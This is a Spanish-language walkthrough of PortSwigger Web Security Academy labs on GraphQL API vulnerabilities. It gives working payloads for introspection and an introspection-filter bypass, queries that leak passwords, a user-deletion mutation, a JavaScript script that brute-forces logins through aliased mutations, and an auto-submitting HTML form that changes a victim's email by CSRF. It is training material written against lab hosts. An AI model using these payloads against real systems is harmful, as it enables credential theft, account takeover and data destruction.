# 23 - GraphQL API vulnerabilities  

## Lab: Accessing private GraphQL posts
 
Utilizando la opción de "click derecho -> GraphQl -> Set Introspection Query". Vemos el schema y en base a este podemos lanzar la query que trae la password del blog con el id = 3 

```
{"query":"\nquery getBlogSummaries {\n    getBlogPost(id: 3) {\n        image\n        title\n        summary\n        id\n    postPassword\n}\n}","operationName":"getBlogSummaries"}
```

## Lab: Accidental exposure of private GraphQL fields

Luego de listar el schema con ayuda de burp "click derecho -> GraphQl -> Set Introspection Query", enviamos el siguiente contenido para traer los datos del usuario administrador  
```
{
	"query" : "{ getUser(id: 1) { id username password }}"
}
```

## Lab: Finding a hidden GraphQL endpoint

Identificamos el endpoint de graphql esto mediante fuzzing web, y modificando el metodo HTTP: 
```
GET /$intruder$
``` 

Luego bypaseamos las defensas que están cuando intentamos listar el schema, lo hacemos añadiendo un salto de linea URL-encode `%0A`
```
GET /api?query=query+IntrospectionQuery+%7b%0a++++__schema%0A+%7b%0a++++++++queryType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++mutationType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++subscriptionType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++types+%7b%0a++++++++++++...FullType%0a++++++++%7d%0a++++++++directives+%7b%0a++++++++++++name%0a++++++++++++description%0a++++++++++++locations%0a++++++++++++args+%7b%0a++++++++++++++++...InputValue%0a++++++++++++%7d%0a++++++++%7d%0a++++%7d%0a%7d%0a%0afragment+FullType+on+__Type+%7b%0a++++kind%0a++++name%0a++++description%0a++++fields%28includeDeprecated%3a+true%29+%7b%0a++++++++name%0a++++++++description%0a++++++++args+%7b%0a++++++++++++...InputValue%0a++++++++%7d%0a++++++++type+%7b%0a++++++++++++...TypeRef%0a++++++++%7d%0a++++++++isDeprecated%0a++++++++deprecationReason%0a++++%7d%0a++++inputFields+%7b%0a++++++++...InputValue%0a++++%7d%0a++++interfaces+%7b%0a++++++++...TypeRef%0a++++%7d%0a++++enumValues%28includeDeprecated%3a+true%29+%7b%0a++++++++name%0a++++++++description%0a++++++++isDeprecated%0a++++++++deprecationReason%0a++++%7d%0a++++possibleTypes+%7b%0a++++++++...TypeRef%0a++++%7d%0a%7d%0a%0afragment+InputValue+on+__InputValue+%7b%0a++++name%0a++++description%0a++++type+%7b%0a++++++++...TypeRef%0a++++%7d%0a++++defaultValue%0a%7d%0a%0afragment+TypeRef+on+__Type+%7b%0a++++kind%0a++++name%0a++++ofType+%7b%0a++++++++kind%0a++++++++name%0a++++++++ofType+%7b%0a++++++++++++kind%0a++++++++++++name%0a++++++++++++ofType+%7b%0a++++++++++++++++kind%0a++++++++++++++++name%0a++++++++++++%7d%0a++++++++%7d%0a++++%7d%0a%7d HTTP/2
Host: 0a6600bb032ae3c9808cf82b005200b3.web-security-academy.net
```

Luego de investigar los distintos querys encontramos uno que nos permite eliminar usuarios: 
``` 
GET /api?query=mutation%20%7B%20deleteOrganizationUser(input%3A%20%7B%20id%3A%203%20%7D)%20%7B%20user%20%7B%20id%20username%20%7D%20%7D%20%7D HTTP/2
Host: 0a6600bb032ae3c9808cf82b005200b3.web-security-academy.net
```

## Lab: Bypassing GraphQL brute force protections

El siguiente script nos ayuda a generar varios intentos de sesión con el formato esperado usando alias, así con un solo request se prueban varias credenciales: 
```javascript
const passwords = `123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`
.split(',');

const aliases = passwords.map((password, index) => `
  bruteforce${index}: login(input: { username: "carlos", password: "${password}" }) {
    token
    success
  }
`).join("\n");

const query = `
mutation bruteforce {
${aliases}
}
`;

const jsonRequest = {
  query: query,
  operationName: "bruteforce",
  variables: {}
};

copy(JSON.stringify(jsonRequest, null, 2));
console.log("La request completa fue copiada al portapapeles ✔");
```

Luego enviamos la request con el contenido que nos genero el script: 
```
POST /graphql/v1 HTTP/2
Host: 0a5a007b046d39a5801f8ba20008002b.web-security-academy.net
Content-Type: application/json
Content-Length: 11443

...data generada por el script..
```

Filtramos en la response el intento que devuelve `"success": true`

## Lab: Performing CSRF exploits over GraphQL

Luego de listar el schema con ayuda de burp "click derecho -> GraphQl -> Set Introspection Query"

Identificamos el body que debemos enviar para cambiar el correo electronico: 
```
{"query":"mutation { changeEmail(input: { email: \"nuevo@mail.com\" }) { email } }"}
```

Luego creamos nuestro sitio malicioso para explotar el CSRF: 
```html
<html> 
<body> 
  <form action="https://0a87009f04dcd36881e64893009e006e.web-security-academy.net/graphql/v1" method="POST"> 
    <input type="hidden" name="query" value="mutation { changeEmail(input: { email: &quot;nuevo@mail.com&quot; }) { email } }">
  </form>

  <script>document.forms[0].submit()</script>
</body>
</html> 
```

